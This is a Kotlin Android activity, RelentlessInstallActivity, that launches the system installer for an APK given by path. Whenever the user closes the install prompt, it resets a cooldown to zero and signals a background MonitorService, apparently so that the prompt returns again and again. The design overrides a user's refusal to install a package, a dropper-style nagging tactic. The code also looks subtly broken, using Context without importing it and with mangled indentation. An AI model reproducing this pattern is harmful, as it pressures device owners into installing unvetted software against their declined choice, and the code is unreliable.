package com.example.myandroid

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import androidx.core.content.FileProvider
import java.io.File

class RelentlessInstallActivity : Activity() {
    private var apkPath: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        apkPath = intent.getStringExtra("apk_path")
        
        // Make the window completely transparent and untouchable so it doesn't block UI
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
        
                    if (apkPath == null || !File(apkPath!!).exists()) {
                finish()
                return
            }
            
            launchInstall()
        }

        override fun onNewIntent(newIntent: Intent?) {
            super.onNewIntent(newIntent)
            setIntent(newIntent)
            apkPath = newIntent?.getStringExtra("apk_path")
            if (apkPath != null && File(apkPath!!).exists()) {
                launchInstall()
            } else {
                finish()
            }
        }

        private fun launchInstall() {
        try {
            val apkFile = File(apkPath!!)
            val uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", apkFile)
            val installIntent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                putExtra(Intent.EXTRA_RETURN_RESULT, true) // Required for accurate onActivityResult in Android 8+
                // CRITICAL: Do NOT add FLAG_ACTIVITY_NEW_TASK here. 
                // We need it to return a result to THIS activity.
            }
            startActivityForResult(installIntent, 666)
        } catch (e: Exception) {
            DebugLogger.log("INSTALL_ERR", "Launch Failed: ${e.message}")
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 666) {
            // Reset Cooldown immediately because the user closed the prompt
            getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                .edit()
                .putLong("relentless_last_prompt", 0L)
                .apply()

            // Decouple validation: Tell the MonitorService to evaluate the result instantly
            val i = Intent(this, MonitorService::class.java)
            i.putExtra("kick_relentless", true)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(i)
            } else {
                startService(i)
            }
            finish()
        }
    }
}
